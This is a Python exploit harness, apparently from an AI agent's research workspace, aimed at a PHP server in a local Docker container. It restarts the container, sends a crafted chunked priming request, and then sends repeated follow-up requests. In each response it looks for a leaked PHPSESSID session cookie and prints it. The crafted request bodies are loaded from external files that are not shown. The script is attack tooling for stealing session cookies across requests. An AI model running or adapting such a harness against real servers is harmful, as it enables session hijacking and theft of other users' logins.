#!/usr/bin/env python3
"""Cold broadcast attempt: A1 once, B1 x N workers, report leak cookie."""
import json, os, subprocess, sys, time
W = "/tmp/opencode/research/modphp_109619_20261023T010232Z"
REPO = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo"
def send(port, path, body, save="", timeout=240):
    cmd = [sys.executable, os.path.join(REPO, "pure", "chunked_send.py"), "--port", str(port),
           "--body-file", body, "--path", path, "--timeout", str(timeout)]
    if save: cmd += ["--save-response", save]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout.strip()
def main():
    port = int(sys.argv[1]); cont = sys.argv[2]; a1 = sys.argv[3]; b1 = sys.argv[4]; n = int(sys.argv[5])
    q = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
    subprocess.run(["docker", "restart", cont], capture_output=True); time.sleep(1.2)
    send(port, "/index.php", os.path.join(W, "work", "warmup_get.bin")) if False else None
    print("A1:", send(port, q, a1))
    time.sleep(0.2)
    for i in range(1, n+1):
        save = os.path.join(W, "work", "b1_resp_%d.bin" % i)
        out = send(port, "/index.php", b1, save)
        data = open(save, "rb").read() if os.path.exists(save) else b""
        j = data.find(b"Set-Cookie: PHPSESSID=")
        if j >= 0:
            val = data[j+len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
            print("B1[%d] %s cookie_len=%d head=%r" % (i, out, len(val), val[:60]))
        else:
            print("B1[%d] %s no-cookie" % (i, out))
if __name__ == "__main__": main()
